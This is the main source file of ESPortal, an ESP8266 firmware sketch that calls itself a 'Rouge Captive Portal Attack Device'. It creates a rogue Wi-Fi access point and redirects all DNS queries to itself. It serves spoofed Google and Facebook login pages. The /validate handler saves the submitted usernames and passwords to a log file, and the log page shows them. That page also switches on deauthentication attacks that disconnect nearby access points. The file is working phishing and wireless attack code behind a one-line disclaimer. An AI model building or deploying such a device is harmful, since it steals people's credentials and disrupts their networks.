/*
  ESPortal by Corey Harding
   www.legacysecuritygroup.com
   Configure access point name and up to 3 custom domains and login urls in config.h
   Configure the html for login page of said domains in site1.h, site2.h, and site3.h
   Configure the html for any other domain(catch-all) in site_other.h
   This is only a proof-of-concept.  I am not responsible for your actions.
   Obey all local, state, federal, and international laws!
*/
#include <ESP8266WiFi.h>
#include <WiFiClient.h>

#include <FS.h>
#include "config.h"
#include "site1.h"
#include "site2.h"
#include "sitecaptiveportal.h"
#include "portal_login.h"
#include "Deauth.h"
#include "SimpleList.h"

#define LOGFILE "/log.txt"

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 8, 1);

String webString = "";
String serialString = "";
Deauth d;
DNSServer dnsServer;
ESP8266WebServer webServer(80);
ESP8266WebServer httpServer(1337);
size_t ap_counter = 0;
bool deauth = false;

unsigned long previousMillis = 0;
const long interval = 1000 * 60 * 10;

void blink(int n)
{
  for (int i = 0; i < n; i++)
  {
    //digitalWrite(LED_BUILTIN, LOW);
    delay(250);
    //digitalWrite(LED_BUILTIN, HIGH);
    delay(250);
  }
}

void setup() {
  //Start Serial
  Serial.begin(9600);
  Serial.println();
  Serial.println("V2.0.0 - Rouge Captive Portal Attack Device");
  Serial.println();

  //pinMode(LED_BUILTIN, OUTPUT);
  //digitalWrite(LED_BUILTIN, HIGH);

  // Initialize file system and log file
  Serial.print("Initializing File System (First time can take around 90 seconds)...");
  SPIFFS.begin();
  Serial.println(" Success!");
  Serial.print("Checking for log.txt file...");
  // this opens the file "log.txt" in read-mode
  File f = SPIFFS.open(LOGFILE, "r");

  if (!f) {
    Serial.print(" File doesn't exist yet. \nFormatting and creating it...");
    SPIFFS.format();
    // open the file in write mode
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f) {
      Serial.println("File creation failed!");
    }
    f.println("Captured Login Credentials:");
  }
  f.close();
  Serial.println(" Success!");
  // End of file system block

  //Create Access Point
  Serial.print("Creating Access Point...");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(setSSID);
  Serial.println(" Success!");

  //Start DNS Server
  Serial.print("Starting DNS Server...");
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Success!");

  //check domain name and refresh page
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });

  //generic catch all login page for domains not listed in configuration
  webServer.on(SITEOTHER_redirect, []() {
    webServer.send_P(200, "text/html", GOOGLE_HTML);
  });

  //SITE1 login page
  webServer.on(SITE1_redirect, []() {
    webServer.send_P(200, "text/html", GOOGLE_HTML);
  });

  //SITE2 login page
  webServer.on(SITE2_redirect, []() {
    webServer.send_P(200, "text/html", FACEBOOK_HTML);
  });

  //Portal login page
  webServer.on(PORTALLOGIN_redirect, []() {
    webServer.send(200, "text/html", PORTAL_LOGIN_HTML);
  });

  //Validate-Save USER/PASS
  webServer.on("/validate", []() {
    // store harvested credentials
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");

    // sending to serial (DEBUG)
    serialString = user + ":" + pass;
    Serial.println(serialString);

    // saving to file
    File f = SPIFFS.open(LOGFILE, "a");
    f.print(url);
    f.print(":");
    f.print(user);
    f.print(":");
    f.println(pass);
    f.close();

    // send an error response
    webString = "<h1>#E701 - Router Configuration Error</h1>";
    webServer.send(500, "text/html", webString);

    // reset strings
    serialString = "";
    webString = "";

    blink(5);
  });

  //Log Page
  webServer.on("/esportal/log", []() {
    webString = "<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><pre>";
    File f = SPIFFS.open(LOGFILE, "r");
    serialString = f.readString();
    webString += serialString;
    f.close();
    webString += "</pre><br><hr><a href=\"/esportal/deauth\"><- Enable deauthentication</a><br><a href=\"/esportal/nodeauth\"><- Disable deauthentication</a>";
    webString += "<br><hr>List for Access Point deauthentication:<br><table>";
    webString += "<tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Signal</th><th>Encrypt.</th><th>Hidden</th></tr>";

    for(size_t i = 0; i < d.getAccessPoints()->size(); i++)
    {
      auto ap = d.getAccessPoints()->get(i);
      webString += "<tr><td>"+ap.ssid+"</td><td>"+ap.s_bssid+"</td><td>"+ap.channel+"</td><td>"+ap.RSSI+"</td><td>"+ap.encryptionType+"</td><td>"+ap.isHidden+"</td></tr>";
    }
    webString += "</table></body></html>";

    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString = "";
    webString = "";
  });

  //Enable or disable deauthentication through web requests
  webServer.on("/esportal/deauth", []() {
    deauth = true;
    d.startScan();
    webString = "<html><head><script>function back(){window.history.go(-1);}</script></head><body onload='back()'>OK</body><html>";
    webServer.send(200, "text/html", webString);
    webString = "";
  });
  webServer.on("/esportal/nodeauth", []() {
    deauth = false;
    webString = "<html><head><script>function back(){window.history.go(-1);}</script></head><body onload='back()'>OK</body><html>";
    webServer.send(200, "text/html", webString);
    webString = "";
  });

  

  //Start Webserver
  Serial.print("Starting Web Server...");
  webServer.begin();
  httpServer.begin();

  MDNS.addService("http", "tcp", 1337);
  Serial.println(" Success!");
  blink(10);
  d.startScan();
  Serial.println("Device Ready!");
}

void loop() {
  //Check for DNS Request/Dish out Web Pages
  if (ap_counter == d.getAccessPoints()->size()) ap_counter = 0;
  dnsServer.processNextRequest();
  webServer.handleClient();
  httpServer.handleClient();
  if (deauth) d.startDeauth(d.getAccessPoints()->get(ap_counter++));

  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= interval) {
    previousMillis = currentMillis;
    //TODO
  }
}
